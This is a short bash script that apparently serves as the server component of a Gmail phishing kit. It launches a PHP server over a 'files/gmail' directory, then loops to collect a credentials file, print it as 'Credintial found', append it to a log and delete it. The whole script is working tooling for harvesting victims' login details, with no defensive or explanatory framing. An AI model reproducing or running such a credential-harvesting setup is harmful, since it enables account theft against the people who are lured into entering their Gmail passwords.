#!/bin/bash
#This script written by pakde
echo ''
echo -n "Enter port : "
read port
if [[ $port == "" ]]; then
	exit 1
fi
echo ""
echo -e "Server stared at \033[1;32mhttp://localhost:$port\033[1;39m"
echo ""
echo "Press ctrl + c for exit "
echo ''
while [ 1 ]
do
        if [ -d files/gmail ]
        then
                cd files/gmail && php -S localhost:$port > /dev/null 2>&1 &
                if [ -e files/gmail/file.txt ]
                then
                        echo -e "\033[1;32mCredintial found [!]"
                        echo -e '\033[1;39m'
                        if [ ! -e files/gmail/l.txt ]
                        then
                                touch files/gmail/l.txt
                        fi
                        cat files/gmail/file.txt >> files/gmail/l.txt
                        cat files/gmail/file.txt
                        rm files/gmail/file.txt
                        echo -e '\033[1;39m'
                        sleep 2
                        echo ""
                        echo -e "Server stared at \033[1;32mhttp://localhost:$port\033[1;39m"
			echo ""
                fi
                sleep 2

        else
                sleep 2
                echo ''
                echo "[-] Server has been stopped"
                echo ''
                break
        fi
done
